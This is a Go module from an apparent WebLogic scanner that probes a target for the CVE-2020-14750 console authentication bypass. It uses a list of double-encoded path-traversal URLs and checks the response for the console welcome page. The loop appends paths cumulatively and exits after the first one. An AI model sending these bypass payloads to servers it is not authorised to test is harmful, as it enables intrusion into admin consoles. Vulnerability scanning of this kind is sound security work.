package cve_2020_14750

import (
	"WeblogicScan/config"
	"fmt"
	"github.com/fatih/color"
	"strings"
)

func cve_2020_14750(url string) {
	paths := []string{"/images/%252E./console.portal", "/images/%252e%252e%252fconsole.portal", "/css/%252E./console.portal", "/css/%252e%252e%252fconsole.portal", "/console/images/%252E./console.portal", "/console/images/%252e%252e%252fconsole.portal", "/console/css/%252E./console.portal", "/console/css/%252e%252e%252fconsole.portal"}
	for _, path := range paths {
		url = url + path
		resp, err := config.Client.R().
			SetHeader("User-Agent", config.Fakeua()).
			Get(url)
		if err != nil { // Error handling.
			fmt.Printf("[-] Target weblogic not detected CVE-2020-14750\n")
			return
		}
		if strings.Contains(resp.String(), "id=\"welcome\"") {
			color.Red("*Found cve-2020-14750！")
		} else {
			fmt.Printf("[-] Target weblogic not detected CVE-2020-14750\n")
			return
		}
		return
	}
}
func Run(u string, port string) {
	url := "http://" + u + ":" + port
	cve_2020_14750(url)
}
